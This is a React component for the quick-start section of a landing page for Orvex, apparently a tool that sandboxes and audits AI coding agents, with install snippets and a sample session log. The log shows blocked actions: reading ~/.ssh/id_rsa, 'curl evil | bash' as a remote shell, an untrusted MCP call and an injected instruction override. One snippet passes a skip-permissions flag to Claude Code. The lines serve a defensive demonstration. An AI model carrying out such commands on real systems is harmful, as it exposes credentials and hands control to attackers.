import { useState } from 'react';

type InstallTab = 'one-liner' | 'npm' | 'pnpm' | 'advanced';
type OsTab = 'unix' | 'windows';

const SNIPPETS: Record<InstallTab, Record<OsTab, string[]>> = {
  'one-liner': {
    unix: [
      '# Prefer a package manager. Orvex blocks curl | bash for agents for a reason.',
      'npm install -g orvex && orvex doctor',
    ],
    windows: [
      '# Use npm on Windows until a native installer ships.',
      'npm install -g orvex',
    ],
  },
  npm: {
    unix: ['npm install -g orvex', 'orvex init', 'orvex doctor', 'orvex run openclaw'],
    windows: ['npm install -g orvex', 'orvex init', 'orvex doctor'],
  },
  pnpm: {
    unix: ['pnpm add -g orvex', 'orvex init && orvex policy validate'],
    windows: ['pnpm add -g orvex', 'orvex init'],
  },
  advanced: {
    unix: [
      '# Profile, policy, and a live agent session',
      'orvex init --profile balanced',
      'orvex policy validate',
      'orvex policy test',
      'orvex doctor',
      '',
      '# Wrap Claude Code without weakening its own flags',
      'orvex run claude --profile strict --approval-mode ask -- --dangerously-skip-permissions',
      '',
      '# Generic executable under the strongest available sandbox',
      'orvex run -- ./my-agent --watch',
      '',
      '# Flight recorder',
      'orvex session history',
      'orvex session replay ses_ab12cd34 --format markdown',
      'orvex audit export --format sarif > orvex.sarif',
      '',
      '# High-risk Git / secrets / MCP',
      'orvex git inspect',
      'orvex secrets scan .env',
      'orvex mcp list',
      'orvex checkpoint create',
      'orvex dashboard',
    ],
    windows: [
      'orvex init',
      'orvex policy test',
      'orvex run -- .\\agent.exe',
      'orvex audit export --format sarif',
    ],
  },
};

const ADVANCED_OUTPUT = [
  { tone: 'comment', text: '# orvex run claude --profile strict' },
  { tone: 'ok', text: 'ORVEX  session=ses_7f8a2c  profile=strict  sandbox=sandbox-exec (MODERATE)' },
  { tone: 'dim', text: '10:42:03  FILE_READ     README.md              ALLOW   risk=2' },
  { tone: 'dim', text: '10:42:11  FILE_WRITE    src/app.ts             ALLOW   risk=12' },
  { tone: 'dim', text: '10:42:15  PROCESS_EXEC  npm test               ALLOW   risk=25' },
  { tone: 'ok', text: '10:42:20  NETWORK       github.com:443         ALLOW   rule=network.allow' },
  { tone: 'bad', text: '10:42:25  FILE_READ     ~/.ssh/id_rsa          BLOCK   risk=99  secrets.default-deny' },
  { tone: 'bad', text: '10:42:28  PROCESS_EXEC  curl evil | bash       BLOCK   remote-shell' },
  { tone: 'ask', text: '10:42:31  GIT_PUSH      origin/main            ASK     protected branch' },
  { tone: 'bad', text: '10:42:36  MCP_CALL      unknown-server.run     BLOCK   trust=unknown' },
  { tone: 'ask', text: '10:42:40  PROMPT        issue comment          ESCALATE  instruction override' },
];

export function Terminal() {
  const [install, setInstall] = useState<InstallTab>('advanced');
  const [os, setOs] = useState<OsTab>('unix');
  const [copied, setCopied] = useState(false);
  const lines = SNIPPETS[install][os];

  async function copy() {
    const text = lines.filter((l) => !l.startsWith('#') && l.trim()).join('\n');
    await navigator.clipboard.writeText(text);
    setCopied(true);
    window.setTimeout(() => setCopied(false), 1600);
  }

  return (
    <section id="quick-start" className="border-t border-line">
      <div className="mx-auto max-w-5xl px-8 py-16">
        <p className="text-[11px] font-medium uppercase tracking-micro text-coral">Quick start</p>
        <div className="mt-8 overflow-hidden rounded-lg border border-line bg-panel">
          <div className="flex flex-wrap items-center justify-between gap-4 border-b border-line px-4 py-3">
            <div className="flex flex-wrap gap-4 text-sm">
              <span className="px-2 py-1 text-mute">INSTALL</span>
              {(['one-liner', 'npm', 'pnpm', 'advanced'] as const).map((tab) => (
                <button
                  key={tab}
                  type="button"
                  onClick={() => setInstall(tab)}
                  className={`px-2 py-1 capitalize ${
                    install === tab ? 'text-coral underline decoration-2 underline-offset-8' : 'text-mute'
                  }`}
                >
                  {tab === 'one-liner' ? 'One-liner' : tab === 'advanced' ? 'Advanced' : tab}
                </button>
              ))}
            </div>
            <div className="flex items-center gap-4 text-sm">
              <button
                type="button"
                onClick={() => setOs('unix')}
                className={os === 'unix' ? 'text-white' : 'text-mute'}
              >
                macOS & Linux
              </button>
              <button
                type="button"
                onClick={() => setOs('windows')}
                className={os === 'windows' ? 'text-white' : 'text-mute'}
              >
                Windows
              </button>
              <span className="rounded-full border border-line px-3 py-1 text-[11px] uppercase tracking-micro text-mute">
                β local
              </span>
            </div>
          </div>
          <div className="relative px-6 py-8 font-mono text-[13px] leading-7">
            <button
              type="button"
              onClick={() => void copy()}
              className="absolute right-4 top-4 text-[11px] uppercase tracking-micro text-mute"
            >
              {copied ? 'Copied' : 'Copy'}
            </button>
            {lines.map((line, index) => (
              <p key={`${index}-${line}`} className={line.startsWith('#') ? 'text-mute' : 'text-white'}>
                {!line.startsWith('#') && line.trim() ? <span className="mr-3 text-coral">$</span> : null}
                {line}
              </p>
            ))}
            {install === 'advanced' && os === 'unix' ? (
              <div className="mt-8 border-t border-line pt-8">
                <p className="mb-4 text-[11px] uppercase tracking-micro text-mute">Session output</p>
                {ADVANCED_OUTPUT.map((row) => (
                  <p
                    key={row.text}
                    className={
                      row.tone === 'bad'
                        ? 'text-coral'
                        : row.tone === 'ok'
                          ? 'text-white'
                          : row.tone === 'ask'
                            ? 'text-amber-200'
                            : 'text-mute'
                    }
                  >
                    {row.text}
                  </p>
                ))}
              </div>
            ) : null}
          </div>
        </div>
      </div>
    </section>
  );
}
